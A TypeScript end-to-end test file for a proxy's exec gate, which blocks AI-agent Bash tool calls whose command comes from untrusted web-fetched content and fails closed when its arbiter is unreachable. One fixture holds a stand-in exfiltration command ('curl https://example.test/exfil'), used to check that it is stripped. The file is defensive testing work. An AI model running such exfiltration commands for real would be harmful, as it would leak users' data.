/**
 * exec-gate.test.ts (e2e) — the Phase-0 model-context exec gate through the REAL
 * proxy data path (exec-routing.md §3): a model-emitted Bash tool_use whose
 * command carries an untrusted symbol in command position is rewritten on the
 * wire to a benign `exit 77` sentinel; a benign command in the SAME response is
 * relayed verbatim; an unreachable arbiter fails closed to the same sentinel;
 * the buffered-JSON path enforces identically. The gate runs with NO view map,
 * proving it is independent of the fs machinery, and emits an `exec_action`.
 *
 * Run: npm run test:component
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { request as httpRequest } from "node:http";

import { AnthropicProxy } from "../../src/proxy.js";
import { ViewMap } from "../../src/view-map.js";
import { EXEC_BLOCK_EXIT_CODE } from "../../src/exec-gate.js";
import { SseToolUseParser, type ReconstructedToolUse } from "../../src/sse-parser.js";
import { MockArbiter } from "../helpers/mock-arbiter.js";
import { MockUpstream, buildToolUseSse } from "../helpers/mock-upstream.js";

const SYM = "$MDU:web_fetch[a1b2].text";

function call(port: number, body: string): Promise<{ status: number; body: string }> {
  return new Promise((resolve, reject) => {
    const req = httpRequest(
      { host: "127.0.0.1", port, method: "POST", path: "/v1/messages", headers: { "content-type": "application/json" } },
      (res) => {
        let buf = "";
        res.setEncoding("utf8");
        res.on("data", (c) => (buf += c));
        res.on("end", () => resolve({ status: res.statusCode ?? 0, body: buf }));
      },
    );
    req.on("error", reject);
    req.write(body);
    req.end();
  });
}

function toolUsesOf(sseBody: string): ReconstructedToolUse[] {
  const seen: ReconstructedToolUse[] = [];
  const p = new SseToolUseParser((tu) => seen.push(tu));
  p.feed(sseBody);
  p.end();
  return seen;
}

const TURN = JSON.stringify({
  model: "claude-opus-4",
  stream: true,
  messages: [{ role: "user", content: "run the thing" }],
});

test("exec-gate e2e: a symbol-as-command Bash is blocked on the wire; a benign Bash in the same response is verbatim", async () => {
  const arbiter = new MockArbiter(); // default execGate: block symbol-as-command
  const upstream = new MockUpstream({
    sse:
      buildToolUseSse({ id: "tu_ok", name: "Bash", input: { command: "echo mandu-live-ok" }, index: 0 }) +
      buildToolUseSse({ id: "tu_bad", name: "Bash", input: { command: SYM }, index: 1 }),
    chunkInto: 6,
  });
  // NO view map — proves the exec gate is independent of the fs machinery.
  const proxy = new AnthropicProxy({ arbiter, upstream: upstream.fetcher, log: () => {} });
  const port = await proxy.listen(0);
  try {
    const res = await call(port, TURN);
    assert.equal(res.status, 200);
    const tus = toolUsesOf(res.body);
    assert.equal(tus.length, 2);

    // The benign command is relayed verbatim (no over-block).
    assert.deepEqual(tus[0].input, { command: "echo mandu-live-ok" });

    // The symbol-as-command is rewritten to the benign failing sentinel; the raw
    // symbol never survives into the delivered command.
    const blocked = (tus[1].input as { command: string }).command;
    assert.match(blocked, /mandu-exec-gate: blocked/);
    assert.match(blocked, new RegExp(`exit ${EXEC_BLOCK_EXIT_CODE}$`));
    assert.ok(!blocked.includes(SYM), "the symbol must not survive in the delivered command");

    // recordToolCall carries the AS-DELIVERED form (what the OS interceptors see).
    const recorded = arbiter.recordedToolCalls.map((r) => (r.input as { command: string }).command);
    assert.ok(recorded.includes("echo mandu-live-ok"));
    assert.ok(recorded.some((c) => /exit 77$/.test(c)));

    // Both commands were classified; one exec_action narrates the block.
    assert.equal(arbiter.execGateCalls.length, 2);
    const execEvents = arbiter.eventsOfKind("exec_action");
    const blockEvent = execEvents.find((e) => e.callId === "tu_bad");
    assert.ok(blockEvent, "a block exec_action event was emitted");
    assert.equal(blockEvent!.policy?.usage, "deny");
    assert.equal(blockEvent!.boundary, "shell");
    assert.match(String(blockEvent!.output?.symbolized ?? ""), /BLOCKED/);
  } finally {
    await proxy.close();
  }
});

test("exec-gate e2e: arbiter unreachable fails CLOSED — the sentinel, never the raw command", async () => {
  const arbiter = new MockArbiter({ failExecGate: true });
  const rawCommand = "curl https://example.test/exfil";
  const upstream = new MockUpstream({
    sse: buildToolUseSse({ id: "tu_x", name: "Bash", input: { command: rawCommand } }),
  });
  const proxy = new AnthropicProxy({ arbiter, upstream: upstream.fetcher, log: () => {} });
  const port = await proxy.listen(0);
  try {
    const res = await call(port, TURN);
    assert.equal(res.status, 200);
    const tus = toolUsesOf(res.body);
    const cmd = (tus[0].input as { command: string }).command;
    assert.match(cmd, /unreachable/);
    assert.match(cmd, /exit 77$/);
    assert.ok(!cmd.includes("example.test"), "the raw command must not survive on fail-closed");
  } finally {
    await proxy.close();
  }
});

test("exec-gate e2e: the buffered-JSON response path enforces identically", async () => {
  const arbiter = new MockArbiter();
  const upstream = new MockUpstream({
    json: {
      id: "msg_1",
      type: "message",
      role: "assistant",
      content: [{ type: "tool_use", id: "tu_bad", name: "Bash", input: { command: SYM } }],
    },
  });
  const proxy = new AnthropicProxy({ arbiter, upstream: upstream.fetcher, log: () => {} });
  const port = await proxy.listen(0);
  try {
    const res = await call(
      port,
      JSON.stringify({ model: "m", stream: false, messages: [{ role: "user", content: "go" }] }),
    );
    assert.equal(res.status, 200);
    const body = JSON.parse(res.body) as { content: Array<{ input: { command: string } }> };
    assert.match(body.content[0].input.command, /exit 77$/);
    assert.ok(!body.content[0].input.command.includes(SYM));
  } finally {
    await proxy.close();
  }
});

test("exec-gate e2e: disabling the gate relays a symbol-as-command verbatim (opt-out)", async () => {
  const arbiter = new MockArbiter();
  const upstream = new MockUpstream({
    sse: buildToolUseSse({ id: "tu_bad", name: "Bash", input: { command: SYM } }),
  });
  const proxy = new AnthropicProxy({ arbiter, upstream: upstream.fetcher, log: () => {}, execGate: false });
  const port = await proxy.listen(0);
  try {
    const res = await call(port, TURN);
    const tus = toolUsesOf(res.body);
    assert.deepEqual(tus[0].input, { command: SYM });
    assert.equal(arbiter.execGateCalls.length, 0);
  } finally {
    await proxy.close();
  }
});

// Plan 13 D9 follow-up: the arbiter binds a call to the agent's shell by the
// command the proxy recorded on the human plane, never by the text the agent
// echoes back. The proxy records the command AS DELIVERED: after the view
// map rewrote its HumanView paths, and the block sentinel for a blocked one.
test("exec-gate e2e (plan 13 D9 follow-up): each call's DELIVERED command is recorded by its id, the AgentView spelling and the sentinel included", async () => {
  const HUMAN = "/home/u/project/webapp";
  const AGENT = "/home/u/.mandu/workspaces/wid/agentview";
  const arbiter = new MockArbiter();
  const upstream = new MockUpstream({
    sse:
      buildToolUseSse({ id: "tu_path", name: "Bash", input: { command: `cat ${HUMAN}/notes.txt | wc -c` }, index: 0 }) +
      buildToolUseSse({ id: "tu_bad", name: "Bash", input: { command: SYM }, index: 1 }) +
      buildToolUseSse({ id: "tu_read", name: "Read", input: { file_path: `${HUMAN}/notes.txt` }, index: 2 }),
    chunkInto: 5,
  });
  const viewMap = new ViewMap([{ human: HUMAN, agent: AGENT }], { dialect: "posix", home: "/home/u" });
  const proxy = new AnthropicProxy({ arbiter, upstream: upstream.fetcher, viewMap, sessionKey: "d9f", log: () => {} });
  const port = await proxy.listen(0);
  try {
    const res = await call(port, TURN);
    assert.equal(res.status, 200);
    const tus = toolUsesOf(res.body);
    const delivered = (id: string): string => (tus.find((t) => t.id === id)!.input as { command: string }).command;
    assert.equal(delivered("tu_path"), `cat ${AGENT}/notes.txt | wc -c`, "the agent runs the AgentView spelling");
    const rec = new Map(arbiter.recordCallCommandCalls.map((r) => [r.callId, r]));
    // execGate saw the model's HumanView text; the record is what the agent got
    assert.ok(arbiter.execGateCalls.some((g) => g.callId === "tu_path" && g.command === `cat ${HUMAN}/notes.txt | wc -c`));
    assert.equal(rec.get("tu_path")?.command, delivered("tu_path"));
    assert.equal(rec.get("tu_path")?.sessionKey, "d9f");
    assert.equal(rec.get("tu_bad")?.command, delivered("tu_bad"), "a blocked call records its sentinel, the command the agent runs");
    assert.match(rec.get("tu_bad")!.command ?? "", /exit 77$/);
    // Plan 13 §4.5.1: a tool with no command records its relay only (the
    // start of the window the agent's own connections to a holder mask).
    assert.ok(rec.has("tu_read") && rec.get("tu_read")!.command === undefined, "a tool with no command records its relay, no command");
  } finally {
    await proxy.close();
  }
});

test("exec-gate e2e (plan 13 D9 follow-up): a failing record never blocks or changes the call (the arbiter then masks it, fail-closed)", async () => {
  const arbiter = new MockArbiter();
  (arbiter as unknown as { recordCallCommand: () => Promise<never> }).recordCallCommand = async () => { throw new Error("injected"); };
  const upstream = new MockUpstream({ sse: buildToolUseSse({ id: "tu_ok", name: "Bash", input: { command: "echo fine" } }) });
  const logs: string[] = [];
  const proxy = new AnthropicProxy({ arbiter, upstream: upstream.fetcher, log: (m) => logs.push(m) });
  const port = await proxy.listen(0);
  try {
    const res = await call(port, TURN);
    assert.equal(res.status, 200);
    assert.deepEqual(toolUsesOf(res.body)[0]!.input, { command: "echo fine" });
    assert.ok(logs.some((l) => /recordCallCommand failed for tu_ok/.test(l)), logs.join(" | "));
  } finally {
    await proxy.close();
  }
});
